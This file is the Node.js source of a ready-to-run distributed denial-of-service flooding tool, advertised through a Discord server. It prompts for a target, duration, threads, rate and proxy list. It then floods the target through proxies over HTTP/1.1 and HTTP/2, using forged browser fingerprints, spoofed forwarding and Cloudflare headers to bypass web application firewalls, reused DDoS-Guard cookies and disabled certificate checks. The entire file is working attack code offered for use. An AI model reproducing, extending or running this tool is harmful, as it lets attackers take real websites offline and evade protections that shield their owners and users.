const net = require("net");
const http2 = require("http2");
const http = require("http");
const tls = require("tls");
const cluster = require("cluster");
const https = require("https");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const argv = require('minimist')(process.argv.slice(2));
const colors = require("colors");
const readline = require('readline-sync');
const chalk = require('chalk');

if (process.argv.length < 7) {
    console.clear();
    console.log(chalk.greenBright.bold("\n=== https://discord.gg/TFFEc6d8bP - TSUKUYOMI REALM NETWORK - NHỮNG KẺ SIMP CÁC CHỊ <3===\n"));

    const method = readline.question(chalk.cyanBright("Method (GET/POST): "));
    const target = readline.question(chalk.cyanBright("Target (https://...): "));
    const time = readline.questionInt(chalk.yellow("Thời gian (s): "));
    const threads = readline.questionInt(chalk.yellow("Threads: "));
    const rate = readline.questionInt(chalk.yellow("RateLimit: "));
    const proxyFile = readline.question(chalk.magenta("Proxy file: "));

    console.log(chalk.greenBright("\n--- Tùy chọn nâng cao ---"));
    const httpVer = readline.question(chalk.blue("HTTP Version (1/2/mix) [enter để bỏ qua]: "));
    const delay = readline.question(chalk.blue("Delay (s) [enter để bỏ qua]: "));
    const debug = readline.keyInYNStrict(chalk.blue("Bật debug? "));
    const randomPath = readline.keyInYNStrict(chalk.blue("Random path? "));
    const spoof = readline.keyInYNStrict(chalk.blue("Spoof IP? "));
    const extra = readline.keyInYNStrict(chalk.blue("Thêm extra headers? "));
    const bypass = readline.keyInYNStrict(chalk.blue("Bypass Cloudflare? "));
    const human = readline.keyInYNStrict(chalk.blue("Mô phỏng hành vi người? "));

    process.argv = [
        process.argv[0], process.argv[1],
        target, time, threads, rate, proxyFile,
        ...(httpVer ? ['--verison', httpVer] : []),
        ...(delay ? ['--delay', delay] : []),
        ...(debug ? ['--debug', 'true'] : []),
        ...(randomPath ? ['--random', 'true'] : []),
        ...(spoof ? ['--spoof', 'true'] : []),
        ...(extra ? ['--extra', 'true'] : []),
        ...(bypass ? ['--bypass', 'true'] : []),
        ...(human ? ['--human', 'true'] : [])
    ];
}

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

process.on('uncaughtException', function (er) {});
process.on('unhandledRejection', function (er) {});

const headers = {};
const humanBehavior = {
    clickPatterns: [
        {delay: 100, count: 3},
        {delay: 200, count: 2},
        {delay: 150, count: 4},
        {delay: 300, count: 1}
    ],
    scrollPatterns: [
        {delay: 500, steps: 5},
        {delay: 300, steps: 8},
        {delay: 700, steps: 3}
    ]
};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function getRandomPrivateIP() {
    const privateIPRanges = [
        "10.0.0.0/8",
        "172.16.0.0/12",
        "192.168.0.0/16"
    ];

    const randomIPRange = privateIPRanges[Math.floor(Math.random() * privateIPRanges.length)];
    const ipParts = randomIPRange.split("/");
    const ipPrefix = ipParts[0].split(".");
    const subnetMask = parseInt(ipParts[1], 10);
    for (let i = 0; i < 4; i++) {
        if (subnetMask >= 8) {
            ipPrefix[i] = Math.floor(Math.random() * 256);
        } else if (subnetMask > 0) {
            const remainingBits = 8 - subnetMask;
            const randomBits = Math.floor(Math.random() * (1 << remainingBits));
            ipPrefix[i] &= ~(255 >> subnetMask);
            ipPrefix[i] |= randomBits;
            subnetMask -= remainingBits;
        } else {
            ipPrefix[i] = 0;
        }
    }
    return ipPrefix.join(".");
}

function getRandomPublicIP() {
    return `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(1, 255)}`;
}

function generateSessionID() {
    return crypto.randomBytes(16).toString('hex');
}

function generateBrowserFingerprint() {
    const canvasKey = crypto.randomBytes(16).toString('hex');
    const webglKey = crypto.randomBytes(16).toString('hex');
    const audioKey = crypto.randomBytes(16).toString('hex');
    return {
        canvas: canvasKey,
        webgl: webglKey,
        audio: audioKey
    };
}

function log(string) {
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();

    if (string.includes('\n')) {
        const lines = string.split('\n');
        lines.forEach(line => {
            console.log(`[${hours}:${minutes}:${seconds}]`.white + ` - ${line}`);
        });
    } else {
        console.log(`[${hours}:${minutes}:${seconds}]`.white + ` - ${string}`);
    }
}

if (process.argv.length < 7) {
    log("** ADVANCED HUMANIZED FLOOD - v4.0 **")
    log(`** Version - HTTP version (${'1/2/mix'.cyan}) **`)
    log(`** Delay - Bypass ratelimits (in seconds) **`)
    log(`** Debug - Enable debugger (${'true/false'.cyan}) **`)
    log(`** Query - Query string (${'true/false'.cyan}) **`)
    log(`** Spoof - Using Rate Headers (${'true/false'.cyan}) **`)
    log(`** Extra - Using Extra Headers (${'true/false'.cyan}) **`)
    log(`** Random - Random request path (${'true/false'.cyan}) **`)
    log(`** Bypass - Bypass Cloudflare WAF (${'true/false'.cyan}) **`)
    log(`** Human - Human-like behavior (${'true/false'.cyan}) **`)
    log("Usage: node flood.js <target> <time> <threads> <rate> <proxyfile> (optional --verison <1/2/mix> --random <true/false> etc.)")
    process.exit();
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[5]),
    threads: parseInt(process.argv[4]),
    proxyFile: process.argv[6],
}

const delay = argv["delay"] || 0;
const verison = argv["verison"] || 2;
const debug = argv["debug"] || "false";
const query = argv["query"] || "false";
const spoof = argv["spoof"] || "false";
const extra = argv["extra"] || "false";
const random = argv["random"] || "false";
const bypass = argv["bypass"] || "false";
const human = argv["human"] || "false";

if (cluster.isPrimary) {
    const info = {
        "Target": args.target,
        "Duration": args.time,
        "optional": {
            "Delay": delay,
            "Version": verison,
            "Debug": debug,
            "Query": query,
            "Spoof": spoof,
            "Random": random,
            "Bypass": bypass,
            "Human": human
        }
    }

    log("INFO".green + "  " + ` ĐÃ THỰC HIỆN TẤN CÔNG DDOS! |dev:bui dang|owner:vinh nguyen|`.white);
    for (let i = 0; i < args.threads; i++) {
        cluster.fork()
    }

    cluster.on('exit', (worker, code, signal) => {});

    setTimeout(() => {
        log("INFO".green + "  " + `Attack is over.`.white);
        process.exit(1);
    }, args.time * 1000);
} else {
    if (verison === '2' || verison === 2) {
        setInterval(() => {
            http2run();
        }, Number(delay) * 1000)
    } else if (verison === '1' || verison === 1) {
        setInterval(() => {
            http1run();
        }, Number(delay) * 1000)
    } else {
        setInterval(() => {
            http1run();
            http2run();
        }, Number(delay) * 1000)
    }
}

const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384"
];

var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

const headerBuilder = {
    userAgent: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/121.0 Mobile/15E148 Safari/605.1.15",
        "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/121.0 Mobile/15E148 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 10; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
    ],

    acceptLang: [
        'en-US,en;q=0.9',
        'en-GB,en;q=0.9',
        'en-CA,en;q=0.9',
        'en-AU,en;q=0.9',
        'fr-FR,fr;q=0.9',
        'de-DE,de;q=0.9',
        'es-ES,es;q=0.9',
        'it-IT,it;q=0.9',
        'pt-BR,pt;q=0.9',
        'ru-RU,ru;q=0.9',
        'ja-JP,ja;q=0.9',
        'zh-CN,zh;q=0.9',
        'zh-TW,zh;q=0.9',
        'ko-KR,ko;q=0.9'
    ],

    acceptEncoding: [
        'gzip, deflate, br',
        'gzip, deflate',
        'gzip, br',
        'deflate, gzip',
        'br, gzip',
        'br'
    ],

    accept: [
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
    ],

    Sec: {
        dest: ['document', 'empty', 'image', 'script', 'style', 'font', 'media', 'worker'],
        site: ['none', 'cross-site', 'same-origin', 'same-site'],
        mode: ['navigate', 'no-cors', 'cors', 'same-origin'],
        ch_ua: [
            '"Not_A Brand";v="8", "Chromium";v="120"',
            '"Google Chrome";v="120", "Chromium";v="120", "Not=A?Brand";v="24"',
            '"Microsoft Edge";v="120", "Chromium";v="120", "Not=A?Brand";v="24"'
        ],
        ch_ua_platform: [
            '"Windows"',
            '"macOS"',
            '"Linux"',
            '"Android"',
            '"iOS"'
        ],
        ch_ua_mobile: ['?0', '?1']
    },

    Custom: {
        dnt: ['0', '1'],
        ect: ['3g', '2g', '4g', '5g', 'slow-2g'],
        downlink: ['0.5', '1', '1.7', '2.5', '3', '5', '10'],
        rtt: ['50', '100', '150', '200', '250', '300', '500'],
        devicememory: ['1', '2', '4', '6', '8', '16', '32'],
        te: ['trailers', 'gzip', 'deflate'],
        version: ['Win64; x64', 'Win32; x32', 'MacIntel', 'Linux x86_64'],
        viewport: ['width=device-width, initial-scale=1.0', 'width=1280', 'width=1920']
    }
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function generateSpoofedFingerprint(userAgent, acceptLanguage) {
    const platform = userAgent.includes('Windows') ? 'Win64' : 
                    userAgent.includes('Mac') ? 'MacIntel' : 
                    userAgent.includes('Linux') ? 'Linux x86_64' : 
                    userAgent.includes('iPhone') ? 'iPhone' : 
                    userAgent.includes('Android') ? 'Android' : 'Win64';
    
    const plugins = [{
            name: 'Chrome PDF Plugin',
            filename: 'internal-pdf-viewer',
            description: 'Portable Document Format'
        },
        {
            name: 'Chrome PDF Viewer',
            filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai',
            description: ''
        },
        {
            name: 'Google Translate',
            filename: 'aapbdbdomjkkjkaonfhkkikfgjllcleb',
            description: 'Translates web pages'
        },
        {
            name: 'Zoom Chrome Extension',
            filename: 'kgjfgplpablkjnlkjmjdecgdpfankdle',
            description: 'Zoom for Chrome'
        },
        {
            name: 'uBlock Origin',
            filename: 'cjpalhdlnbpafiamejdnhcphjbkeiagm',
            description: 'An efficient blocker'
        },
        {
            name: 'AdBlock',
            filename: 'gighmmpiobklfepjocnamgkkbiglidom',
            description: 'The most popular Chrome extension'
        },
        {
            name: 'Grammarly for Chrome',
            filename: 'kbfnbcaeplbcioakkpcpgfkobkghlhen',
            description: 'Grammar and spell checker'
        },
        {
            name: 'Adobe Acrobat',
            filename: 'efaidnbmnnnibpcajpcglclefindmkaj',
            description: 'Adobe Acrobat PDF plug-in'
        },
        {
            name: 'Widevine Content Decryption Module',
            filename: 'widevinecdmadapter.dll',
            description: 'Enables Widevine licenses for playback of HTML audio/video content.'
        },
        {
            name: 'Native Client',
            filename: 'internal-nacl-plugin',
            description: ''
        }
    ];

    const numPlugins = randomIntn(2, 6);
    const selectedPlugins = [];

    for (let i = 0; i < numPlugins; i++) {
        const randomIndex = randomIntn(0, plugins.length - 1);
        selectedPlugins.push(plugins[randomIndex]);
    }

    const fingerprintComponents = {
        userAgent,
        acceptLanguage,
        platform,
        plugins: selectedPlugins,
        screenResolution: `${randomIntn(1280, 3840)}x${randomIntn(720, 2160)}`,
        timezone: `UTC${randomIntn(-12, 12)}:00`,
        hardwareConcurrency: randomIntn(2, 16),
        deviceMemory: randomElement(headerBuilder.Custom.devicememory),
        touchSupport: userAgent.includes('Mobile') ? 'true' : Math.random() > 0.7 ? 'true' : 'false',
        doNotTrack: Math.random() > 0.5 ? '1' : '0',
        webglVendor: Math.random() > 0.5 ? 'Google Inc.' : 'Intel Inc.',
        webglRenderer: Math.random() > 0.5 ? 'ANGLE (Intel(R) UHD Graphics 630 Direct3D11 vs_5_0 ps_5_0)' : 'ANGLE (NVIDIA GeForce RTX 3080 Direct3D11 vs_5_0 ps_5_0)',
        audioContext: crypto.randomBytes(8).toString('hex'),
        canvasHash: crypto.randomBytes(16).toString('hex')
    };

    const fingerprintString = JSON.stringify(fingerprintComponents);
    const sha256Fingerprint = crypto.createHash('sha256').update(fingerprintString).digest('hex');

    return {
        fingerprint: sha256Fingerprint,
        components: fingerprintComponents
    };
}

function generateHumanClickPattern() {
    const pattern = randomElement(humanBehavior.clickPatterns);
    const delays = [];
    for (let i = 0; i < pattern.count; i++) {
        delays.push(pattern.delay + randomIntn(-50, 50));
    }
    return delays;
}

function generateHumanScrollPattern() {
    const pattern = randomElement(humanBehavior.scrollPatterns);
    const steps = [];
    for (let i = 0; i < pattern.steps; i++) {
        steps.push({
            delay: pattern.delay + randomIntn(-100, 100),
            position: Math.floor((i / pattern.steps) * 100)
        });
    }
    return steps;
}

function http2run() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const selectedUserAgent = randomElement(headerBuilder.userAgent);
    const selectedLanguage = randomElement(headerBuilder.acceptLang);
    const fingerprintData = generateSpoofedFingerprint(selectedUserAgent, selectedLanguage);

    headers[":method"] = "GET";
    headers[":authority"] = parsedTarget.host;
    headers[":scheme"] = "https";
    headers["x-forwarded-proto"] = "https";
    headers["upgrade-insecure-requests"] = "1";
    headers["sec-fetch-user"] = "?1";
    headers["x-requested-with"] = "XMLHttpRequest";

    if (random === 'true') {
        headers[":path"] = "/" + randstr(10);
    } else if (query === 'true') {
        headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
    } else {
        headers[":path"] = parsedTarget.path;
    }

    headers["user-agent"] = selectedUserAgent;
    headers["sec-fetch-dest"] = randomElement(headerBuilder.Sec.dest);
    headers["sec-fetch-mode"] = randomElement(headerBuilder.Sec.mode);
    headers["sec-fetch-site"] = randomElement(headerBuilder.Sec.site);
    headers["accept"] = randomElement(headerBuilder.accept);
    headers["accept-language"] = selectedLanguage;
    headers["accept-encoding"] = randomElement(headerBuilder.acceptEncoding);
    
    // Enhanced browser fingerprinting headers
    headers["sec-ch-ua"] = randomElement(headerBuilder.Sec.ch_ua);
    headers["sec-ch-ua-mobile"] = selectedUserAgent.includes('Mobile') ? '?1' : '?0';
    headers["sec-ch-ua-platform"] = randomElement(headerBuilder.Sec.ch_ua_platform);
    headers["viewport-width"] = fingerprintData.components.screenResolution.split('x')[0];
    
    if (extra === 'true') {
        headers["DNT"] = randomElement(headerBuilder.Custom.dnt);
        headers["RTT"] = randomElement(headerBuilder.Custom.rtt);
        headers["Downlink"] = randomElement(headerBuilder.Custom.downlink);
        headers["Device-Memory"] = fingerprintData.components.deviceMemory;
        headers["Ect"] = randomElement(headerBuilder.Custom.ect);
        headers["TE"] = randomElement(headerBuilder.Custom.te);
        headers["DPR"] = "2.0";
        headers["Service-Worker-Navigation-Preload"] = "true";
        headers["sec-ch-ua-arch"] = "x86";
        headers["sec-ch-ua-bitness"] = "64";
        headers["sec-ch-ua-full-version"] = "120.0.0.0";
        headers["sec-ch-ua-model"] = "";
        headers["sec-ch-prefers-color-scheme"] = Math.random() > 0.5 ? "light" : "dark";
        headers["sec-ch-prefers-reduced-motion"] = Math.random() > 0.8 ? "reduce" : "no-preference";
        headers["sec-ch-viewport-width"] = fingerprintData.components.screenResolution.split('x')[0];
        headers["sec-ch-device-memory"] = fingerprintData.components.deviceMemory;
        headers["sec-ch-ua-full-version-list"] = headers["sec-ch-ua"].replace(/"/g, '') + ", " + randomElement(headerBuilder.Sec.ch_ua).replace(/"/g, '');
    }

    if (spoof === 'true') {
        const realIP = getRandomPublicIP();
        headers["X-Real-Client-IP"] = realIP;
        headers["X-Real-IP"] = realIP;
        headers["X-Remote-Addr"] = realIP;
        headers["X-Remote-IP"] = realIP;
        headers["X-Forwarder"] = realIP;
        headers["X-Forwarder-For"] = realIP;
        headers["X-Forwarder-Host"] = realIP;
        headers["X-Forwarding"] = realIP;
        headers["X-Forwarding-For"] = realIP;
        headers["Forwarded"] = `for=${realIP};proto=https`;
        headers["Forwarded-For"] = realIP;
        headers["Forwarded-Host"] = parsedTarget.host;
        headers["True-Client-IP"] = realIP;
        headers["CF-Connecting-IP"] = realIP;
    }

    if (bypass === 'true') {
        headers["cf-connecting-ip"] = getRandomPublicIP();
        headers["cf-ipcountry"] = randomElement(["US", "GB", "CA", "AU", "DE", "FR", "JP", "SG"]);
        headers["cf-ray"] = `${randstr(8)}-${randomElement(["SIN", "LHR", "DFW", "MIA", "CDG", "NRT"])}`;
        headers["cf-visitor"] = '{"scheme":"https"}';
        headers["cf-request-id"] = crypto.randomBytes(16).toString('hex');
        headers["cf-worker"] = Math.random() > 0.5 ? "production" : "development";
    }

    if (human === 'true') {
        headers["x-human-behavior"] = "1";
        headers["x-session-id"] = generateSessionID();
        headers["x-client-timestamp"] = Date.now().toString();
        headers["x-click-pattern"] = generateHumanClickPattern().join(',');
        headers["x-scroll-pattern"] = JSON.stringify(generateHumanScrollPattern());
    }

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 600000);

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2'],
            socket: connection,
            ciphers: cipper,
            ecdhCurve: "prime256v1:secp384r1:secp521r1",
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: ["TLSv1_1_method", "TLS_method", "TLSv1_2_method", "TLSv1_3_method"],
            fingerprint: fingerprintData.fingerprint,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 10000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 10000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
        });

        client.on("connect", () => {
            const humanPattern = human === 'true' ? generateHumanClickPattern() : [0];
            
            humanPattern.forEach((delay, index) => {
                setTimeout(() => {
                    for (let i = 0; i < args.Rate; i++) {
                        const request = client.request(headers)
                            .on("response", response => {
                                if (debug === 'true') {
                                    const jsonDebug = {
                                        proxy: proxyAddr,
                                        code: response[':status'],
                                        headers: response
                                    };
                                    log('DEBUG'.yellow + '  ' + JSON.stringify(jsonDebug));
                                }

                                if (response['server'] === 'ddos-guard') {
                                    const cookies = response['set-cookie'];
                                    let formattedCookies = '';

                                    if (cookies && cookies.length > 0) {
                                        formattedCookies = cookies
                                            .map(cookie => cookie.split(';')[0].trim())
                                            .join(';');
                                        if (formattedCookies.includes('__ddg1_')) {
                                            headers["cookie"] = String(formattedCookies);
                                        }
                                    }
                                }

                                request.close();
                                request.destroy();
                                return;
                            });

                        request.end();
                    }
                }, delay);
            });
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return;
        });
    });
}

function http1run() {
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = proxy.split(':');

    var req = http.request({
        host: proxy[0],
        port: proxy[1],
        ciphers: cipper,
        method: 'CONNECT',
        path: parsedTarget.host + ":443"
    }, (err) => {
        req.end();
        return;
    });

    var queryString;

    if (random === 'true') {
        queryString = "/" + randstr(10);
    } else if (query === 'true') {
        queryString = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
    } else {
        queryString = parsedTarget.path;
    }

    req.on('connect', function (res, socket, head) {
        var tlsConnection = tls.connect({
            host: parsedTarget.host,
            ciphers: cipper,
            secureProtocol: 'TLS_method',
            servername: parsedTarget.host,
            secure: true,
            rejectUnauthorized: false,
            socket: socket
        }, function () {
            const selectedUserAgent = randomElement(headerBuilder.userAgent);
            const selectedLanguage = randomElement(headerBuilder.acceptLang);
            const fingerprintData = generateSpoofedFingerprint(selectedUserAgent, selectedLanguage);
            const humanPattern = human === 'true' ? generateHumanClickPattern() : [0];
            
            humanPattern.forEach((delay, index) => {
                setTimeout(() => {
                    for (let j = 0; j < args.Rate; j++) {
                        let headers = "GET " + queryString + " HTTP/1.1\r\n" +
                            "Host: " + parsedTarget.host + "\r\n" +
                            "Referer: " + args.target + "\r\n" +
                            "Origin: " + args.target + "\r\n" +
                            `Accept: ${randomElement(headerBuilder.accept)}\r\n` +
                            "User-Agent: " + selectedUserAgent + "\r\n" +
                            "Upgrade-Insecure-Requests: 1\r\n" +
                            `Accept-Encoding: ${randomElement(headerBuilder.acceptEncoding)}\r\n` +
                            `Accept-Language: ${selectedLanguage}\r\n` +
                            "Cache-Control: max-age=0\r\n" +
                            "Connection: Keep-Alive\r\n";

                        if (extra === 'true') {
                            headers += `sec-ch-ua: ${randomElement(headerBuilder.Sec.ch_ua)}\r\n`;
                            headers += `sec-ch-ua-mobile: ${selectedUserAgent.includes('Mobile') ? '?1' : '?0'}\r\n`;
                            headers += `sec-ch-ua-platform: ${randomElement(headerBuilder.Sec.ch_ua_platform)}\r\n`;
                            headers += `DNT: ${randomElement(headerBuilder.Custom.dnt)}\r\n`;
                            headers += `RTT: ${randomElement(headerBuilder.Custom.rtt)}\r\n`;
                            headers += `Downlink: ${randomElement(headerBuilder.Custom.downlink)}\r\n`;
                            headers += `Device-Memory: ${fingerprintData.components.deviceMemory}\r\n`;
                            headers += `Ect: ${randomElement(headerBuilder.Custom.ect)}\r\n`;
                            headers += `TE: ${randomElement(headerBuilder.Custom.te)}\r\n`;
                        }

                        if (spoof === 'true') {
                            const realIP = getRandomPublicIP();
                            headers += `X-Forwarding-For: ${realIP}\r\n`;
                            headers += `X-Real-IP: ${realIP}\r\n`;
                            headers += `Forwarded: for=${realIP};proto=https\r\n`;
                        }

                        if (bypass === 'true') {
                            headers += `cf-connecting-ip: ${getRandomPublicIP()}\r\n`;
                            headers += `cf-ipcountry: ${randomElement(["US", "GB", "CA", "AU", "DE", "FR", "JP", "SG"])}\r\n`;
                            headers += `cf-ray: ${randstr(8)}-${randomElement(["SIN", "LHR", "DFW", "MIA", "CDG", "NRT"])}\r\n`;
                            headers += `cf-visitor: {"scheme":"https"}\r\n`;
                        }

                        if (human === 'true') {
                            headers += `x-human-behavior: 1\r\n`;
                            headers += `x-session-id: ${generateSessionID()}\r\n`;
                            headers += `x-client-timestamp: ${Date.now()}\r\n`;
                        }

                        headers += `\r\n`;

                        tlsConnection.write(headers);
                    }
                }, delay);
            });
        });

        tlsConnection.on('error', function (data) {
            tlsConnection.end();
            tlsConnection.destroy();
        });

        tlsConnection.on("data", (chunk) => {
            const responseLines = chunk.toString().split('\r\n');
            const firstLine = responseLines[0];
            const statusCode = parseInt(firstLine.split(' ')[1], 10);

            if (debug === 'true') {
                if (statusCode !== null && !isNaN(statusCode)) {
                    const jsonDebug = {
                        proxy: proxy[0] + ":" + proxy[1],
                        code: statusCode
                    };
                    log('DEBUG'.yellow + '  ' + JSON.stringify(jsonDebug));
                }
            }

            delete chunk;
            setTimeout(function () {
                return delete tlsConnection;
            }, 10000);
        });
    });

    req.end();
}